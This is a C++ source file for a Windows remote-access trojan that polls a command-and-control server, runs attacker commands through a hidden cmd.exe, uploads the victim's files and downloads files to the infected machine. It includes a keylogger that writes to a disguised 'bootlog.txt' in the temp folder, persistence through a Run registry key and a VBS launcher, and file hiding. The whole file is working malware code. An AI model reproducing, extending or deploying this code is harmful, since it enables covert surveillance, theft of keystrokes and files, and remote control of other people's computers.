#include "agent.h"
#include "http.h"
#include "crypt.h"
#include "threads.h"
#include "global.h"
#include "extern.h"

LRESULT WINAPI hook_keylogger(int nCode, WPARAM wParam, LPARAM lParam);
std::string keylogger_file;
THREAD threads[MAXTHREADS];

using namespace std;

/*
Constructor of the Class
*/

Agent::Agent(const std::string& _server_url, const std::string& _botid, const unsigned int _sleep_interval, const std::string& _service_name,
	const std::string& _user_agent, const std::string& _keylogger_file) {
	if (_botid.empty()) {
		botid = get_hostname();
	}
	else {
		botid = _botid;
	}
	os_name = get_os_name();
	server_url = _server_url;
	sleep_interval = _sleep_interval;
	service_name = _service_name;
	user_agent = _user_agent;
	running = false;
	keylogger_state = false;
	if (_keylogger_file.empty()) {
		char* pPath;
		pPath = getenv("TEMP");
		keylogger_file.append(pPath);
		keylogger_file.append("\\bootlog.txt");
	}
	else {
		keylogger_file = _keylogger_file;
	}
}

/*
PRIVATE Functions
*/

string Agent::get_hostname() {
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD length;
	GetComputerNameA(hostname, &length);
	return hostname;
}

string Agent::get_os_name() {
	string os_name = run_command("ver", true);
	return os_name;
}

string Agent::get_wd() {
	char cwd[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, cwd);
	return cwd;
}

string Agent::get_next_command() {
	std::vector<unsigned char> _cmd = http_request(server_url + "/api/pop?botid=" + botid + "&sysinfo=" + os_name, "GET", NULL, NULL, "", user_agent);

	int wchars_num;
	char* str;
	wchar_t* wstr;

	string cmd(_cmd.begin(), _cmd.end());
	wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
	wstr = new wchar_t[wchars_num];
	MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wstr, wchars_num);
	str = new char[wchars_num];
	wcstombs(str, wstr, wchars_num);
	cmd = string(str);

	delete[] wstr;
	delete[] str;
	return cmd;
}

void Agent::send_output(const std::string& output) {
	string url_encoded = url_encode(output);
	int postSize = strlen("output=") + url_encoded.length() + strlen("&botid=") + botid.length();
	char* postData = new char[postSize + 1];
	sprintf(postData, "output=%s&botid=%s", url_encoded.c_str(), botid.c_str());
	http_request(server_url + "/api/report", "POST", postData, postSize, "Content-Type: application/x-www-form-urlencoded; charset=ISO-8859-1", user_agent);
	delete[] postData;
}

void Agent::wait_for_tick()
{
	Sleep(sleep_interval * 1000);
}

/*
PUBLIC functions
*/

void Agent::hide_unhide_file(const std::string& filename) {
	DWORD dwAttrs;
	LPCSTR FileNameStr;
	string message;

	FileNameStr = (LPCSTR)filename.c_str();
	dwAttrs = GetFileAttributes(FileNameStr);
	if (dwAttrs & FILE_ATTRIBUTE_HIDDEN) {
		SetFileAttributes(FileNameStr, (dwAttrs & !FILE_ATTRIBUTE_HIDDEN));
		message = "unHidding file ";
	}
	else {
		SetFileAttributesA(FileNameStr, (dwAttrs | FILE_ATTRIBUTE_HIDDEN));
		message = "Hidding file ";
	}
	send_output(message + filename);
}

void Agent::GetStatus(void)
{
	string message;
	char errmsg[256];

	message = "Status :";
#ifdef DEBUGME
	message.append(" WARNING DEBUG RELEASE !!!");
#endif
	message.append("\nHostname: ");
	message.append(get_hostname());
	message.append("\nOS Name:");
	message.append(get_os_name());
	message.append("\nWorking Dir:");
	message.append(get_wd());
	message.append("\nInterval of polling:");
	_itoa(sleep_interval, errmsg, 10);
	message.append(errmsg);
	message.append("\nKeylogger state:");
	if (keylogger_state == true)
	{
		message.append("Activated !\n destination file:");
		message.append(keylogger_file);
	}
	else {
		message.append("not activated");
	}

	send_output(message);
	return;
}

void Agent::keylogger(bool state)
{
	KEYLOG keylog;
	if (state == true) {
		if (keylogger_state == true) {
			send_output("Keylogger already running ...");
			return;
		}
		else {
			// OK we will start the keylogger
			keylogger_output_stream = fopen(keylogger_file.c_str(), "a+");
			if (keylogger_output_stream == NULL) {
				send_output("ERROR the output file \"" + keylogger_file + "\" can't be opened, so keylogger can't start.");
				return;
			}
			fprintf(keylogger_output_stream, "\n\nKeylogger file\n--------------\n");
			// ask to the second thread to initiate the keylogger process
			keylogger_state = true;
			keylog.state = keylogger_state;

			keylogger_task = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WinAPIextentionK, (LPVOID)&keylogger_state, 0, NULL);
			if (keylogger_task == NULL)
			{
				DWORD dw = GetLastError();
				char errmsg[256];
				_itoa(dw, errmsg, 10);
				string message = "Keylogger is NOT started ... (";
				message.append(errmsg);
				message.append(")\nlook at https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx for an explanation");
				send_output(message);
				fflush(keylogger_output_stream);
				fclose(keylogger_output_stream);
			}
			else {
				fflush(keylogger_output_stream);
				send_output("Keylogger is started ...");
			}
			return;
		}
	}
	else {
		if (keylogger_state == false) {
			send_output("Keylogger already stopped ...");
			return;
		}
		else {
			// OK we got enougth data, so we stop the keylogger
			// ask to the second thread to end the keylogger process
			keylogger_state = false;
			keylog.state = keylogger_state;
			// now ask the system to be sure the thread is terminated
			WaitForMultipleObjects(1, &keylogger_task, FALSE, sleep_interval * 1000);
			// Send a QUIT to the window of keylogger
			SendMessageA(keylogger_handle_window, WM_QUIT, 0, 0);
			// do a sleep to be sure the hook is terminated
			wait_for_tick();
			// kill thread if it's not already killed
			if (keylogger_task != NULL)
			{
				TerminateThread(keylogger_task, NULL);
			}
			send_output("Keylogger STOPPED, and output file is \"" + keylogger_file + "\". Remember to upload and delete it");
			return;
		}
	}
}

std::string Agent::run_command(const std::string& command, bool isLocal) {
	SECURITY_ATTRIBUTES saAttr;
	HANDLE readOUT = NULL;
	HANDLE writeOUT = NULL;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	CreatePipe(&readOUT, &writeOUT, &saAttr, 0);

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

	siStartInfo.cb = sizeof(STARTUPINFO);

	siStartInfo.hStdError = writeOUT;
	siStartInfo.hStdOutput = writeOUT;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	siStartInfo.wShowWindow = SW_HIDE;

	string commandline = "cmd.exe /c " + command;
	CreateProcessA(NULL,
		(LPSTR)commandline.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo);

	WaitForSingleObject(piProcInfo.hProcess, 10000);

	string cmd_output;
	char cmdBuffer[100];
	DWORD read;

	PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
	while (read) {
		ReadFile(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL);
		cmd_output.append(cmdBuffer, read);
		PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
	}

	int wchars_num = MultiByteToWideChar(CP_OEMCP, 0, cmd_output.c_str(), -1, NULL, 0);
	wchar_t* wstr = new wchar_t[wchars_num];
	MultiByteToWideChar(CP_OEMCP, 0, cmd_output.c_str(), -1, wstr, wchars_num);
	char* str = new char[wchars_num];
	wcstombs(str, wstr, wchars_num);
	cmd_output = string(str);
	delete[] wstr;
	delete[] str;

	CloseHandle(piProcInfo.hThread);
	CloseHandle(piProcInfo.hProcess);

	if (!isLocal && !cmd_output.empty()) {
		send_output(cmd_output);
	}

	return cmd_output;
}

void Agent::help() {
	string help = HELP_TEXT;
	send_output(help);
}

void Agent::download(const std::string& url) {
	std::vector<unsigned char> resp = http_request(url, "GET", NULL, NULL, "", user_agent);
	if (resp.empty()) {
		send_output("No response while downloading: " + url);
		return;
	}

	string filename = url.substr(url.rfind("/") + 1);
	if (filename.empty()) {
		filename = "downloaded";
	}

	FILE* f = fopen(filename.c_str(), "wb");
	if (f == NULL) {
		send_output("Could not open file for writing: " + filename);
		return;
	}
	fwrite(&resp[0], 1, resp.size(), f);
	fclose(f);

	send_output("Downloaded: '" + filename + "' here : " + get_wd());
}

void Agent::upload(const std::string& filename) {
	string basename = filename.substr(filename.rfind("/") + 1);
	basename = basename.substr(basename.rfind("\\") + 1);

	string boundary = "---------------------------287055381131322";

	string tbody_start =
		"--" + boundary + "\r\n"
		"Content-Disposition: form-data; name=\"botid\"\r\n"
		"\r\n" +
		botid +
		"\r\n"
		"--" + boundary + "\r\n"
		"Content-Disposition: form-data; name=\"uploaded\"; filename=\"" + basename + "\"\r\n"
		"\r\n";
	string tbody_end = "\r\n--" + boundary + "--\r\n";

	FILE* f = fopen(filename.c_str(), "rb");
	if (f == NULL) {
		send_output("Could not open file: " + filename);
		return;
	}
	fseek(f, 0, SEEK_END);
	unsigned long size = ftell(f);
	rewind(f);

	size_t body_size = tbody_start.length() + tbody_end.length() + size;
	char* const bodyPtr = new char[body_size];
	char* body = bodyPtr;
	memcpy(body, tbody_start.c_str(), tbody_start.length());
	body += tbody_start.length();
	fread(body, 1, size, f);
	fclose(f);
	body += size;
	memcpy(body, tbody_end.c_str(), tbody_end.length());

	http_request(server_url + "/api/upload", "POST", bodyPtr, body_size, "Content-Type: multipart/form-data; boundary=" + boundary, user_agent);
	delete[] bodyPtr;
}

void Agent::setInterval(const unsigned int new_interval) {
	sleep_interval = new_interval;
	char buffer[100];
	_itoa(new_interval, buffer, 10);
	send_output("Sleep interval is now " + string(buffer));
}

void Agent::setServiceName(const std::string& new_servicename) {
	service_name = new_servicename;
	send_output("Service name is now " + service_name + ". Run \"persistence clean\" and \"persistence install\" again to apply.");
}

void Agent::setKeyloggerFile(const std::string & new_keylogger_file)
{
	if (keylogger_state == true) {
		// need to stop keylogger if it run
		send_output("Keylogger is running, stop it before change output file");
	}
	else {
		send_output("Keylogger filename is now " + new_keylogger_file + ". Remember to upload the old file \"" + keylogger_file + "\" if it's not empty.");
		keylogger_file = new_keylogger_file;
	}
}

void Agent::open(const std::string& args) {
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.wShowWindow = SW_HIDE;

	CreateProcessA(NULL,
		(LPSTR)args.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo);

	DWORD wait_result = WaitForSingleObject(piProcInfo.hProcess, 10000);

	if (wait_result == WAIT_OBJECT_0) {
		char pid[10];
		_itoa(piProcInfo.dwProcessId, pid, 10);
		send_output("Process created [" + string(pid) + "]");
	}
	else {
		send_output("Failed to launch process \"" + args + "\"");
	}

	CloseHandle(piProcInfo.hThread);
	CloseHandle(piProcInfo.hProcess);
}

void Agent::cd(const std::string& newdir) {
	int ret = _chdir(newdir.c_str());
	if (ret == 0)
		send_output("Entering " + get_wd());
	else
		send_output("Can't go to " + newdir + ". Stay in " + get_wd());
}

void Agent::persist(const std::string& options) {
	char tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);

	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	string servicePath = tempPath + service_name + ".exe";
	string vbs_path = tempPath + service_name + ".vbs";

	if (options == "install") {
		send_output("Generating VBS file...");
		string vbs =
			"Set oShell = WScript.CreateObject (\"WScript.Shell\")\r\n"
			"oShell.run \"cmd.exe /c " + servicePath + "\", 0\r\n";

		FILE *vbs_file = fopen(vbs_path.c_str(), "wb");
		fwrite(vbs.c_str(), 1, vbs.length(), vbs_file);
		fclose(vbs_file);

		send_output("Adding registrey key...");
		run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v " +
			service_name + " /t REG_SZ /d \\\"" + vbs_path + "\\\"");

		send_output("Copying " + string(exePath) + " to " + servicePath + " ...");
		CopyFileA(exePath, servicePath.c_str(), FALSE);

		send_output("[*] Persistence installed");
	}

	else if (options == "clean") {
		send_output("Adding RunOnce key for executable removal...");
		run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /f /v " +
			service_name + " /t REG_SZ /d \"cmd.exe /c del \\\"" + servicePath + "\\\"");
		send_output("Removing VBS file...");
		run_command(string("del ") + vbs_path.c_str());
		send_output("Removing registrey key...");
		run_command("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v " +
			service_name);
		send_output("[*] Executable will be removed upon next restart");
	}

	else {
		send_output("Usage: persistence install|clean");
	}
}

void Agent::stop() {
	if (keylogger_state) {
		send_output("Keylogger is running, you must stop it before exit");
	}
	else {
		running = false;
		send_output("This is the end,\nBeautiful friend,\nThis is the end,\nMy only friend, the end");
	}
}

void Agent::LockScreen() {
	run_command("rundll32.exe user32.dll,LockWorkStation");
	send_output("Screen is now locked");
}

void Agent::GetOS() {
	run_command("wmic os get name");
}


void Agent::execute(const std::string& commandline) {
	string command = commandline.substr(0, commandline.find(" "));
	string args = commandline.substr(commandline.find(" ") + 1);

	// end process
	if (command == "exit") {
		stop();
	}
	else if (command == "help") {
		help();
	}
	// change working directory
	else if (command == "cd") {
		cd(args);
	}
	// upload a local file to the server
	else if (command == "upload") {
		upload(args);
	}
	// download a file through http
	else if (command == "download") {
		download(args);
	}
	// install / remove persistence
	else if (command == "persistence") {
		persist(args);
	}
	// open a program asynchronously
	else if (command == "open") {
		open(args);
	}
	// interval between each command pull from the CNC
	else if (command == "setinterval") {
		setInterval(atoi(args.c_str()));
	}
	// name of the persistent service
	else if (command == "setservicename") {
		setServiceName(args);
	}
	// display all status
	else if (command == "status") {
		GetStatus();
	}
	// name of the keylogger output file
	else if (command == "setkeyloggerfile") {
		setKeyloggerFile(args);
	}
	// hide of unhide a file
	else if (command == "hide_unhide") {
		hide_unhide_file(args);
	}
	// get just the os name
	else if (command == "getos") {
		GetOS();
	}
	// Lock the screen of the slave
	else if (command == "lockscreen") {
		LockScreen();
	}
	// start or stop the keylogger
	else if (command == "keylogger") {
		if (args == "start" || args == "stop") {
			if (args == "start") {
				keylogger(true);
			}
			else {
				keylogger(false);
			}
		}
		else {
			send_output("Error can't understand : \"" + args + "\"");
		}
	}
	// if this is a single line, run the command through a shell
	else if (commandline.find("\n") == string::npos) {
		run_command(commandline);
	}
	// else, it's probably an HTML error page so we do nothing
}

void Agent::run() {
	const char MutexID[] = MUTEXID;

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, MutexID), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	running = true;

	while (running) {
		string commandline = get_next_command();

		// nothing to do, checking back later...
		if (commandline.empty()) {
			wait_for_tick();
		}
		else {
			size_t found = 0;
			do {
				found = commandline.find(";");
				while (found != string::npos && found != 0 && commandline[found - 1] == '\\') {
					commandline.erase(found - 1, 1);
					found = commandline.find(";", found);
				}
				if (found != string::npos) {
					string cmd = commandline.substr(0, found);
					commandline.erase(0, found + 1);
					execute(cmd);
				}
				else {
					execute(commandline);
				}
			} while (found != string::npos);
		}
	}
}